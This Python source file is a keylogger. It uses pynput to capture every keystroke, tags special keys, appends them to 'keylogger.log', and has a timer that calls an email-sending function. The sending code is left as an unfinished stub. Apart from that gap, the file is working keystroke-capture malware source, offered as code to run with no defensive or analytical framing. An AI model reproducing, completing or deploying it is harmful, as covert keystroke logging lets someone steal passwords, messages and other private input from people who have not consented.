from pynput.keyboard import Key, Listener
import sys
import os
from threading import Thread
import threading
import time

username = os.getlogin() # Getting username from user
dirFile = os.path.dirname(os.path.abspath(__file__)) + "\\" # Workink directory
nameFile = os.path.basename(__file__)
keylog = "keylogger.log"

def send_output_via_email():
    data = open(dirFile+keylog)
    # write the last code
    #print(data) # test
    print("Data Sended Test Timer")

def on_press(key): 
    if key == Key.esc:
        sys.exit(0)
    if key == Key.space:
        key = " "
    if key == Key.enter:
        key = "[ENTER]\n"
    if key == Key.cmd_l or key == Key.cmd_r:
        key = "[CMD]"
    if key == Key.ctrl_l or key == Key.ctrl_r:
        key = "[CTRL]"
    if key == Key.shift_l or key == Key.shift_r:
        key = "[SHIFT]"
    if key == Key.delete:
        key = "[CANC]"
    if key == Key.backspace:
        key = "[BACKSPACE]"
    if key == Key.caps_lock:
        key = "[CAPSLOCK]"
    if key == Key.alt_l or key == Key.alt_r:
        key = "[ALT]"
    if key == Key.tab:
        key = "[TAB]"

    output = str(key).replace("'", "")
    
    #print(output) # for test and debug in real time
    print(output, end='') # for test and debug - print output in the same line
    log =  open(dirFile + keylog, "a+")    
    log.write(str(output) + "\r")

with Listener(on_press=on_press) as listener:
    def timer():
        send_output_via_email()
        threading.Timer(60, timer).start()
            
    timer()
    listener.join()
